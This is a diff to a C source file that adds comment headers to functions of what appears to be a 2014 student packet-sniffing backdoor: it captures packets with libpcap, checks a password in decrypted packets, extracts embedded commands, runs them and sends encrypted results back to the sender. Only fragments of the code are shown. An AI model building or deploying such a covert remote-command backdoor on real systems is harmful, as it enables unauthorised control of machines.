@@ -1,5 +1,21 @@
 #include "pktcap.h"
-
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: startPacketCapture
+-- 
+-- DATE: 2014/09/06
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port)
+-- 
+-- RETURNS: 0, not important
+-- 
+-- NOTES: Initializes packet capture on dst port or src host
+----------------------------------------------------------------------------------------------------------------------*/
 int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port){
 	
 	char nic_dev[BUFFER];		// NIC device name to monitor
@@ -62,12 +78,48 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char 
 	pcap_loop(nic_descr, -1, pkt_callback, NULL);
 	return 0;
 }
+
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: stopPacketCapture
+-- 
+-- DATE: 2014/09/06
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
+-- 
+-- RETURNS: 0, not important
+-- 
+-- NOTES: Stops the libpcap capture loop... except the loop blocks the thread, and cant be called from other threads.
+--        Should be attached to a signal handler
+----------------------------------------------------------------------------------------------------------------------*/
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
 	pcap_freecode(&fp);
 	pcap_close(nic_descr);
 	return 0;
 }
-
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: pkt_callback
+-- 
+-- DATE: 2014/09/06
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
+-- 
+-- RETURNS: void
+-- 
+-- NOTES: Callback function of libpcap loop.  When packet is received, goes through this.
+--        decrypts, checks for password, passes elsewhere for further processing
+----------------------------------------------------------------------------------------------------------------------*/
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
 {		
 	const struct ip_struct * ip;
@@ -146,6 +198,23 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	return;
 
 }
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: parse_cmd
+-- 
+-- DATE: 2014/09/06
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: char * parse_cmd(char * data)
+-- 
+-- RETURNS: string of received command/text
+-- 
+-- NOTES: extracts data between delimiters 
+----------------------------------------------------------------------------------------------------------------------*/
 char * parse_cmd(char * data)
 {
 	char * start, * end;
@@ -166,7 +235,23 @@ char * parse_cmd(char * data)
 
 	return command;
 }
-
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: send_command
+-- 
+-- DATE: 2014/09/06
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int send_command(char * command, const struct ip_struct * ip, const int dest_port)
+-- 
+-- RETURNS: 0 for ok, -1 for error
+-- 
+-- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
+----------------------------------------------------------------------------------------------------------------------*/
 int send_command(char * command, const struct ip_struct * ip, const int dest_port)
 {
 	FILE *fp;
